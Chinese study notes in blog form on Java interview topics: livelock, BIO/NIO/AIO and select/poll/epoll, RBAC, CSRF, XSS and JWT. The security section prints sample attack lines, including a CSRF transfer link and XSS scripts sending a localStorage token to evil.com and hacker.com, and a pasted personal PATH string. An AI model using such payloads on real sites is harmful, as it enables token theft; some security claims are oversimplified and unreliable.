<h3 id="🔹-定义：-2">🔹 定义：</h3>
<p>活锁是指多个线程虽然没有阻塞，但由于<strong>彼此在不断响应对方的动作而陷入不断重试</strong>的状态，导致<strong>始终无法完成任务</strong>。</p>
<h3 id="🔹-特点：">🔹 特点：</h3>
<ul>
<li>线程没有被阻塞（不像死锁那样卡住）；</li>
<li>但线程在“忙于处理”，永远没有进展；</li>
<li>类似两个人在门口让来让去，谁也进不去。</li>
</ul>
<h3 id="🔹-示例（让来让去）：">🔹 示例（让来让去）：</h3>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">boolean</span> hasActed = <span class="literal">false</span>; <span class="string">``</span>    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">passDoorway</span>(<span class="params"><span class="title class_">Person</span> other</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (!hasActed) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!other.<span class="property">hasActed</span>) &#123; <span class="string">``</span>                <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="title class_">Thread</span>.<span class="title function_">currentThread</span>().<span class="title function_">getName</span>() + <span class="string">&quot;: 你先过&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123; <span class="string">``</span>                    <span class="title class_">Thread</span>.<span class="title function_">sleep</span>(<span class="number">50</span>); <span class="string">``</span>                &#125; <span class="keyword">catch</span> (<span class="title class_">InterruptedException</span> e) &#123;&#125; <span class="string">``</span>            &#125; <span class="keyword">else</span> &#123; <span class="string">``</span>                hasActed = <span class="literal">true</span>; <span class="string">``</span>                <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="title class_">Thread</span>.<span class="title function_">currentThread</span>().<span class="title function_">getName</span>() + <span class="string">&quot;: 好的，我过了&quot;</span>); <span class="string">``</span>            &#125; <span class="string">``</span>        &#125; <span class="string">``</span>    &#125; <span class="string">``</span>&#125; <span class="string">` `</span><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LivelockDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="title function_">main</span>(<span class="params"><span class="title class_">String</span>[] args</span>) &#123;</span><br><span class="line">        <span class="title class_">Person</span> p1 = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="title class_">Person</span> p2 = <span class="keyword">new</span> <span class="title class_">Person</span>(); <span class="string">``</span>        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; p1.<span class="title function_">passDoorway</span>(p2), <span class="string">&quot;小明&quot;</span>).<span class="title function_">start</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; p2.<span class="title function_">passDoorway</span>(p1), <span class="string">&quot;小红&quot;</span>).<span class="title function_">start</span>(); <span class="string">``</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>两人互相谦让，程序无限循环，典型活锁。</p>
</blockquote>
<h2 id="✅-三、面试总结话术-✅">✅ 三、面试总结话术 ✅</h2>
<blockquote>
<p>饥饿是线程<strong>一直得不到资源</strong>而无法执行，可能由于高优先级线程抢占、锁分配不公等；而活锁是线程<strong>一直在运行但没有进展</strong>，因为大家都在“礼让”或“响应”，类似“你先来我后来”互相等待。两者都属于资源调度不合理的问题，但不同于死锁。</p>
</blockquote>
<h2 id="三种-I-O-编程模型BIO、NIO、AIO及I-O-多路复用实现方式select、poll、epoll">三种 I/O 编程模型BIO、NIO、AIO及I/O 多路复用实现方式select、poll、epoll</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzBmNWI4YzkxODFhMjU3M2JlNjM4OThhODA1YjcxNmVfakN6RzZ3eE1FMHNub3pBVnJCZm5ETlF3cnRjOXAyNVpfVG9rZW46VzlibWI5empKbzRGS3B4emtSdWMzNUh4bnhiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODEzOWZjZDVmZjJjMmJjNjFhOWFlODc3YzUwMTBlZWZfWmpzZ2VTdkMxZmhnUnF6Uk9OcG5YekZCSXVORFdNdklfVG9rZW46WTRDU2J1aXN0b013a1p4VHZOdmMzekNsbk9nXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-为什么有人会说是“五种模型？">✅ 为什么有人会说是“五种模型？</h2>
<p>因为很多文章/面试中混用了“模型”和“底层机制”这两个层次，列成：</p>
<blockquote>
<p><strong>BIO、NIO、AIO、select、epoll（或 poll）= 五种 I/O 模型</strong></p>
</blockquote>
<p>但严格来讲这是不准确的。真正的分类应该是：</p>
<ul>
<li><strong>I/O 编程模型（3 种）：BIO、NIO、AIO</strong></li>
<li><strong>I/O 多路复用机制（3 种）：select、poll、epoll</strong>（用于实现 NIO）</li>
</ul>
<h2 id="✅-总结一句话记忆：">✅ 总结一句话记忆：</h2>
<blockquote>
<p>select/poll/epoll 不是 I/O 模型，它们是实现 “非阻塞 I/O” 的手段，NIO 模型是编程语义，epoll 是系统内核行为。</p>
</blockquote>
<p>如果你面试中被问“五种 I/O 模型”，推荐这样回答：</p>
<blockquote>
<p>严格来说，I/O 编程模型应分为 BIO、NIO 和 AIO 三种； select、poll、epoll 是 Linux 下多路复用的三种实现方式，本质是支撑 NIO 的机制； 实际开发中，我们常说五种是因为把模型和机制合在一起讲。</p>
</blockquote>
<h2 id="✅-二、模型原理-举例讲解">✅ 二、模型原理 &amp; 举例讲解</h2>
<h3 id="🅰️-1-BIO（Blocking-IO）——“一连接一线程”">🅰️ 1. BIO（Blocking IO）——“一连接一线程”</h3>
<h4 id="❗-特点：">❗ 特点：</h4>
<ul>
<li>阻塞读写</li>
<li>每个 socket 连接一个线程来处理</li>
<li>线程资源消耗大，不适合高并发</li>
</ul>
<h4 id="✅-示例（Java）：">✅ 示例（Java）：</h4>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket serverSocket = new ServerSocket(<span class="number">8080</span>);<span class="string">` `</span>Socket <span class="keyword">socket</span> = serverSocket.accept(); <span class="regexp">//</span> 阻塞 <span class="string">``</span>InputStream in = socket.getInputStream(); <span class="string">``</span>in.read(); <span class="regexp">//</span> 仍然阻塞</span><br></pre></td></tr></table></figure>
<h3 id="🅱️-2-NIO（Non-blocking-IO）——“一个线程管理多个连接”">🅱️ 2. NIO（Non-blocking IO）——“一个线程管理多个连接”</h3>
<h4 id="❗-特点：-2">❗ 特点：</h4>
<ul>
<li>核心组件：<code>Channel</code>（通道）、<code>Buffer</code>（缓冲区）、<code>Selector</code>（选择器）</li>
<li>不再为每个连接创建线程，而是注册到 selector</li>
</ul>
<h4 id="✅-示例逻辑：">✅ 示例逻辑：</h4>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ServerSocketChannel ssc = ServerSocketChannel.open(); <span class="string">``</span>ssc.configureBlocking(<span class="literal">false</span>);<span class="string">` `</span>Selector selector = Selector.open(); <span class="string">``</span>ssc.register(selector, SelectionKey.OP_ACCEPT); <span class="string">` `</span>// 轮询 select() <span class="string">``</span><span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="string">``</span>    selector.select();</span><br><span class="line">    <span class="keyword">for</span> (SelectionKey key : selector.selectedKeys()) &#123;</span><br><span class="line">        // 处理连接、读写事件<span class="string">` `</span>    &#125; <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="🅾️-3-AIO（Asynchronous-IO）——“操作系统负责通知你”">🅾️ 3. AIO（Asynchronous IO）——“操作系统负责通知你”</h3>
<h4 id="❗-特点：-3">❗ 特点：</h4>
<ul>
<li>异步非阻塞，系统调用立即返回，数据准备好后由内核主动通知应用（回调）</li>
<li>Windows 和 Linux 的支持差异较大，Java AIO 在 Linux 下性能反而不如 NIO</li>
</ul>
<h4 id="✅-示例逻辑（Java-AIO）：">✅ 示例逻辑（Java AIO）：</h4>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AsynchronousServerSocketChannel server = AsynchronousServerSocketChannel.open(); <span class="string">``</span>server.accept(<span class="built_in">null</span>, <span class="literal">new</span> CompletionHandler&lt;<span class="params">...</span>&gt;() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="literal">void</span> completed(<span class="params">...</span>)&#123;  <span class="comment">// 连接建立 ``        // 继续读` `    &#125; ``&#125;);</span></span><br></pre></td></tr></table></figure>
<h3 id="🧬-4-多路复用模型（select、poll、epoll）">🧬 4. 多路复用模型（select、poll、epoll）</h3>
<h4 id="✅-select（经典，多平台支持）">✅ select（经典，多平台支持）</h4>
<ul>
<li>使用 fd 集合，调用 <code>select()</code> 后阻塞，等待 fd 就绪</li>
<li>缺点：每次调用都要复制 fd 集合 + 遍历全部 FD + 最大 1024 限制</li>
</ul>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd_set readfds; <span class="string">``</span><span class="keyword">select</span>(maxfd+<span class="number">1</span>, &amp;readfds, <span class="params">...</span>);</span><br></pre></td></tr></table></figure>
<h4 id="✅-poll（select-的改进）">✅ poll（select 的改进）</h4>
<ul>
<li>用 <code>pollfd[]</code> 数组替代了 <code>fd_set</code>，突破了 FD 数量限制</li>
<li>问题：仍需遍历每一个 FD 状态，没有事件驱动能力</li>
</ul>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct pollfd fds<span class="selector-attr">[1000]</span>; ``<span class="built_in">poll</span>(fds, <span class="number">1000</span>, timeout);</span><br></pre></td></tr></table></figure>
<h4 id="✅-epoll（Linux-独有，最优）">✅ epoll（Linux 独有，最优）</h4>
<ul>
<li>使用内核事件驱动机制，只返回发生事件的 FD</li>
<li>不需要每次传入所有 FD，只注册一次即可</li>
<li>支持 ET（边缘触发）和 LT（水平触发）</li>
<li>支持大规模并发连接（&gt;10万）</li>
</ul>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> epfd = epoll_create(<span class="number">1</span>); <span class="string">``</span>epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;ev); <span class="string">``</span>epoll_wait(epfd, events, MAX_EVENTS, timeout);</span><br></pre></td></tr></table></figure>
<h4 id="✅-Java-NIO-底层就是用-epoll（Linux）或-select（Windows）">✅ Java NIO 底层就是用 epoll（Linux）或 select（Windows）</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWRhNGExYmFiYjY5NzljYTcyMWFiYjI3ZWE1Y2FjOTRfdFhQWWttdW1wZXdKRHh1aTE5WGk3dDlhZmh1WnNWSVNfVG9rZW46SXVqdmJmdjFvb05XZUR4eXZYd2Njd2xNbkZiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="✅-五、面试答题模板">✅ 五、面试答题模板</h2>
<blockquote>
<p>操作系统 I/O 模型分为 BIO、NIO、AIO，以及多路复用技术 select、poll、epoll。 其中 epoll 是 Linux 下最主流的高性能方案，它基于事件驱动、支持海量连接、效率高。 在实际 Java 后端开发中，Netty 就是基于 NIO 封装的异步 IO 框架，底层用 epoll 实现 Selector。</p>
</blockquote>
<p>C:\Windows\system32;D:\software\jdk17\bin;D:\software\jdk17\jre\bin;C:\ProgramData\Oracle\Java\javapath;D:\software\VM\bin;C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0;C:\Windows\System32\OpenSSH;C:\Program Files (x86)\NVIDIA Corporation\PhysX\Common;C:\Program Files\NVIDIA Corporation\NVIDIA NvDLISR;D:\software\Bandizip;D:\software\Tomcat9\apache-tomcat-9.0.96\bin;D:\software\maven\apache-maven-3.6.1\bin;D:\Windows Kits\10\Windows Performance Toolkit;D:\software\Tomcat9\apache-tomcat-9.0.96\bin;D:\software\Git\cmd;D:\software\微信web开发者工具\dll;D:\software\JMeter\apache-jmeter-5.6.3\bin;D:\software\nvm;D:\software\nodejs;D:\software\nodejs18.19.0;D:\software\nodejs18.19.0\node_modules\npm\bin;D:\software\nodejs18.19.0\node_modules;C:\Program Files\Docker\Docker\resources\bin;C:\Users\纪堡\AppData\Local\Microsoft\WindowsApps;C:\Users\纪堡\AppData\Local\GitHubDesktop\bin;D:\software\Microsoft VS Code\bin;D:\software\MinGw\MinGW\bin;D:\software\nodejs18.19.0\node_global;D:;\jizu\modelsim_ase\win32aloem;D:;\jizu\modelsim_ase\win32aloem;D:;\jizusy\modelsim_ase\win32aloem;D:;\jizusy\modelsim_ase\win32aloem;D:\software\</p>
<h1>javaguide-系统设计</h1>
<h2 id="认证授权">认证授权</h2>
<h3 id="RBAC模型">RBAC模型</h3>
<p>系统权限控制最常采用的访问控制模型就是 <strong>RBAC 模型</strong> 。</p>
<p><strong>什么是 RBAC 呢？</strong> RBAC 即基于角色的权限访问控制（Role-Based Access Control）。这是一种通过角色关联权限，角色同时又关联用户的授权的方式。</p>
<p>简单地说：一个用户可以拥有若干角色，每一个角色又可以被分配若干权限，这样就构造成“用户-角色-权限” 的授权模型。在这种模型中，用户与角色、角色与权限之间构成了多对多的关系</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjcyMjNiNDFkMzg5ZDMwMWJjN2U2NWI0YWNiN2RlYzVfa1UwNFlGeE1QaExQanpXNjNJbE5oY2o4NEVyU244WE1fVG9rZW46Rjh5TmI5cmt4b3dkSDh4WHo4TmN1SEJybjdxXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>在 RBAC 权限模型中，权限与角色相关联，用户通过成为包含特定角色的成员而得到这些角色的权限，这就极大地简化了权限的管理。</p>
<p>为了实现 RBAC 权限模型，数据库表的常见设计如下（一共 5 张表，2 张用户建立表之间的联系）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWI2N2JkMzQ1NThjN2ZjYjUyYjYxN2U4NTljMWEzMzRfRm1rZm1KeWtyMll5WjZYY3VwbXVYNzVBUDlpc0FvbExfVG9rZW46TjdRU2IzV211b0duNkh4OUFjNWNqYk9YbkVnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="为什么-Cookie-无法防止-CSRF-攻击，而-Token-可以？XSS又是什么？">为什么 Cookie 无法防止 CSRF 攻击，而 Token 可以？XSS又是什么？</h3>
<p><strong>CSRF(Cross Site Request Forgery)</strong> 一般被翻译为 <strong>跨站请求伪造</strong> 。那么什么是 <strong>跨站请求伪造</strong> 呢？说简单点，就是用你的身份去发送一些对你不友好的请求。举个简单的例子：</p>
<p>小壮登录了某网上银行，他来到了网上银行的帖子区，看到一个帖子下面有一个链接写着“科学理财，年盈利率过万”，小壮好奇的点开了这个链接，结果发现自己的账户少了 10000 元。这是这么回事呢？原来黑客在链接中藏了一个请求，这个请求直接利用小壮的身份给银行发送了一个转账请求,也就是通过你的 Cookie 向银行发出请求。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a src=http:<span class="comment">//www.mybank.com/Transfer?bankId=11&amp;money=10000&gt;科学理财，年盈利率过万&lt;/&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面也提到过，进行 <code>Session</code> 认证的时候，我们一般使用 <code>Cookie</code> 来存储 <code>SessionId</code>,当我们登陆后后端生成一个 <code>SessionId</code> 放在 Cookie 中返回给客户端，服务端通过 Redis 或者其他存储工具记录保存着这个 <code>SessionId</code>，客户端登录以后每次请求都会带上这个 <code>SessionId</code>，服务端通过这个 <code>SessionId</code> 来标示你这个人。如果别人通过 <code>Cookie</code> 拿到了 <code>SessionId</code> 后就可以代替你的身份访问系统了。</p>
<p><code>Session</code> 认证中 <code>Cookie</code> 中的 <code>SessionId</code> 是由浏览器发送到服务端的，借助这个特性，攻击者就可以通过让用户误点攻击链接，达到攻击效果。</p>
<p>但是，我们使用 <code>Token</code> 的话就不会存在这个问题，在我们登录成功获得 <code>Token</code> 之后，一般会选择存放在 <code>localStorage</code> （浏览器本地存储）中。然后我们在前端通过某些方式会给每个发到后端的请求加上这个 <code>Token</code>,这样就不会出现 CSRF 漏洞的问题。因为，即使你点击了非法链接发送了请求到服务端，这个非法请求是不会携带 <code>Token</code> 的，所以这个请求将是非法的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NmE4ODJkZWI5MDgxM2M2ZGJhNzNhOGRhZTE1OTcxMTBfQmhWdWhoUG95cWkzT3RwcWN6dnFqekFtb3hZNFV3Y0xfVG9rZW46UnlkamJheURzbzgxU1Z4SXdzT2NGdEZibjJVXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY2MTk0MTEyNmZhZDYwZGE2NWRmMjNlNWRmZTZiMTlfSWZnWWdmeWQxUlkxNlhLUldaeWxNWFluMm5qckVocklfVG9rZW46TG1ZVWJERWFpb2xRbnp4dEtpdmN5SmJFblBiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzZhZTlhMTQ4YjlmNjA4Yzk4MWQwYmI0NGUzOTk5YTNfOUltWHlGcTNFQlEzUVQzWDBOcVV2Vm04TDVxMUtYUGZfVG9rZW46VDhuamJvTE5Fb0dWRmJ4Vmd4bmNLVlJWbkZmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YmIxN2E5YjAwMjkzYzI5NmIwMzFmMjhlMWU5MWY5ZDVfNURwQzZmR0JLMEFYd1lxR2o2RjdtUkwwWjdoRjJiZzVfVG9rZW46SWd5VGJKand1b21hVFh4R3BvRGN5b0tMbkNiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<blockquote>
<p><strong>Token 认证机制天然防御 CSRF，因为请求不会自动携带 Token。</strong></p>
</blockquote>
<p>这句话的意思是： <strong>CSRF 攻击依赖浏览器自动携带 Cookie，而 Token 认证机制不会自动携带，它是由前端主动添加的，所以攻击者无法伪造这个请求。</strong></p>
<h2 id="✅-为什么-Cookie-会导致-CSRF？">✅ 为什么 Cookie 会导致 CSRF？</h2>
<p><strong>因为浏览器有一个特性：对于同源的 Cookie，它会</strong>自动添加到每一个请求中，哪怕这个请求是通过钓鱼链接发起的，用户根本没察觉。</p>
<p>所以：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> <span class="symbol">http:</span>/<span class="regexp">/bank.com/</span><span class="title class_">Transfer</span>?money=<span class="number">10000</span> <span class="string">``</span><span class="title class_">Cookie</span>: sessionId=abc123</span><br></pre></td></tr></table></figure>
<p>浏览器自动加了 <code>sessionId=abc123</code>，攻击者就“冒充”你把钱转走了。</p>
<h2 id="✅-Token-为什么就不会被攻击者利用？">✅ Token 为什么就不会被攻击者利用？</h2>
<p>因为 Token（比如 JWT）<strong>不是浏览器自动加的，而是前端代码手动加的</strong>。</p>
<p>通常流程如下：</p>
<h3 id="🌟-登录后：">🌟 登录后：</h3>
<p>服务端生成一个 JWT，返回给前端：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="string">``</span>  <span class="string">&quot;token&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6...&quot;</span> <span class="string">``</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="🌟-前端保存方式：">🌟 前端保存方式：</h3>
<p>一般保存在：</p>
<ul>
<li><code>localStorage</code></li>
<li>或 <code>sessionStorage</code></li>
</ul>
<blockquote>
<p>⚠️ 不保存到 Cookie！</p>
</blockquote>
<h3 id="🌟-发送请求时：">🌟 发送请求时：</h3>
<p>前端通过 JS <strong>手动</strong>添加这个 token 到请求头中：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="string">/api/userinfo</span> ``Authorization: Bearer eyJhbGciOiJIUzI1NiIs.<span class="string">..</span></span><br></pre></td></tr></table></figure>
<h2 id="✅-攻击者无法做的事：">✅ 攻击者无法做的事：</h2>
<p>攻击者通过伪造 <code>&lt;a&gt;</code>、<code>&lt;form&gt;</code>、<code>&lt;img&gt;</code> 标签来发请求时：</p>
<h3 id="❌-无法访问你的-localStorage">❌ 无法访问你的 localStorage</h3>
<p>浏览器的同源策略限制了 JS 的读取权限，<strong>攻击者拿不到 token</strong></p>
<h3 id="❌-无法添加自定义的请求头">❌ 无法添加自定义的请求头</h3>
<p>通过 <code>&lt;form&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;a&gt;</code> 发出的请求<strong>无法设置 Authorization 头</strong></p>
<p>所以攻击者无法模拟你登录状态，攻击失败 ✅</p>
<h2 id="✅-举个例子对比">✅ 举个例子对比</h2>
<h3 id="🎯-传统-Cookie-登录（容易被-CSRF）">🎯 传统 Cookie 登录（容易被 CSRF）</h3>
<ol>
<li>登录后，浏览器保存 cookie：<code>sessionId=abc123</code></li>
<li>攻击者引导你点击：</li>
<li><code>&lt;img src=&quot;http://bank.com/transfer?money=10000&quot;&gt;</code></li>
<li>浏览器自动带 cookie 发请求</li>
<li>钱没了 ✅</li>
</ol>
<h3 id="🎯-JWT-Token-登录（安全）">🎯 JWT Token 登录（安全）</h3>
<ol>
<li>登录后，前端将 JWT 存储在 <code>localStorage</code></li>
<li>攻击者诱导你点击相同链接</li>
<li>请求发出，但：
<ol>
<li><strong>没有 token</strong></li>
<li>请求头缺少 <code>Authorization</code></li>
</ol>
</li>
<li>服务端拒绝请求 ✅</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MGM2MjVlZGQ3NzdiOTIzOTNhZjE5YTAwMzk4OTBhZTZfOHlrQ2ZTa0YxVXlkb2lvSHRyQ0FGZlVyQW1MR3JtckNfVG9rZW46Tkt4WmJUZGNEb3hBQ1V4eFhmM2NLVGxIbk5oXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="一、XSS-是什么？">一、XSS 是什么？</h2>
<p><strong>XSS（Cross-Site Scripting，跨站脚本攻击）</strong> 是指攻击者<strong>在网页中注入恶意脚本</strong>（JavaScript），一旦被浏览器执行，就可能：</p>
<ul>
<li>窃取用户的 Cookie / Token</li>
<li>冒充用户操作（如发起请求）</li>
<li>劫持页面 DOM 或跳转</li>
<li>显示钓鱼页面</li>
</ul>
<h2 id="二、XSS-攻击的本质">二、XSS 攻击的本质</h2>
<blockquote>
<p>攻击者想办法“让你浏览器执行他写的 JS”</p>
</blockquote>
<p><strong>核心目标</strong>：获取你浏览器里的隐私信息，或利用你的身份去做操作。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzk0MDkxYTBkM2MyZjg5NjI0OTY4NWJhOWM4ZTk4NDNfRG40RXllU2FnVHRjOHdZYm4xTUIwaWk5eU1LNHFjTEtfVG9rZW46VGhKamJQSUdqb0NaSEd4UmVtd2NlNUk0blhnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="三、Token-为什么防不了-XSS？">三、Token 为什么防不了 XSS？</h2>
<p>很多人以为：我用了 token，就比 cookie 安全了，但这是不完全正确的。</p>
<h3 id="✅-Token-可以防-CSRF（因为不自动带）">✅ Token 可以防 CSRF（因为不自动带）</h3>
<p>CSRF 是服务器被动收到伪造请求，只要不自动携带身份（如 Cookie），就可以防。</p>
<h3 id="❌-但-Token-无法防止-XSS，原因如下：">❌ 但 <strong>Token 无法防止 XSS</strong>，原因如下：</h3>
<ol>
<li><strong>XSS 是 JS 脚本攻击 → 可以通过 JS 拿到 localStorage 的 token</strong></li>
<li>Token 通常保存在 <code>localStorage</code> 或 <code>sessionStorage</code>，一旦 XSS 成功，攻击者可以轻松读取：</li>
</ol>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> token = localStorage.getItem(<span class="string">&quot;auth_token&quot;</span>);` `fetch(<span class="string">&quot;``<span class="subst">http://hacker.com?token=</span>``&quot;</span> + token);</span><br></pre></td></tr></table></figure>
<p>所以：</p>
<ul>
<li>Cookie 被 XSS 读取风险较小（HttpOnly 可防止 JS 访问）</li>
<li>Token 被 XSS 读取风险较大（JS 可读 localStorage）</li>
</ul>
<h2 id="四、举个实际例子">四、举个实际例子</h2>
<p>假设一个评论系统，用户可以发帖，用户 A 发表评论时输入了：</p>
<script>
  fetch("http://evil.com?token=" + localStorage.getItem("token"))
</script>
<p>该评论被展示在网页上，用户 B 登录状态打开页面后，这段脚本会运行：</p>
<p>✅ localStorage 可被 JS 读取 → token 被窃取</p>
<p>❌ HttpOnly Cookie 不能被 JS 读取 → 更安全（不能完全防 XSS，但能防信息泄露）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Y0MWM1NGQ4MTcyY2ZkZTVmNjUxYTE3N2QxYTkzYWZfVlhVMURjVHkyTE5TM1hFNGdmNmhHSmhtSmVVOU1WUWVfVG9rZW46T3ptSWI2ZTBOb0Y4ajR4QWdDbmNORktsbmZnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>同源策略防的是 XSS，不防 CSRF；要防 CSRF，得用 token / SameSite / Referer 等机制。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=N2E4NTM5YmQyZGE2NmFmNWUyNWE3YTI3MmNjMTNkOWNfZ3FCNGtGQWhTeFdiSkZCcEFUZDdteTRTYnl1UnkyQXhfVG9rZW46WmpWWWJ0V0dqb0kwd2x4WEZ5b2M0Y2V3bmtkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="jwt的优缺点">jwt的优缺点</h3>
<h3 id="一、JWT-是“自包含”的">一、JWT 是“自包含”的</h3>
<blockquote>
<p>✅ <strong>“自包含”的意思是：</strong> <strong>JWT 本身就已经包含了用户身份信息（如 userId、角色权限等），服务端不需要再去查数据库或者 session 表来找这类信息</strong>。</p>
</blockquote>
<h3 id="👨💻-举个登录认证的对比例子：">👨💻 举个登录认证的对比例子：</h3>
<h4 id="✅-传统-Session-认证：">✅ 传统 Session 认证：</h4>
<ol>
<li>用户登录成功后，服务端生成一个 <code>sessionId</code>，保存在内存或 Redis 中，同时给客户端发个 <code>sessionId</code>。</li>
<li>客户端下次访问，会带上这个 <code>sessionId</code>。</li>
<li>服务端收到请求后，需要去 Redis 查这个 <code>sessionId</code> 对应的用户是谁，再决定是否允许访问。</li>
</ol>
<blockquote>
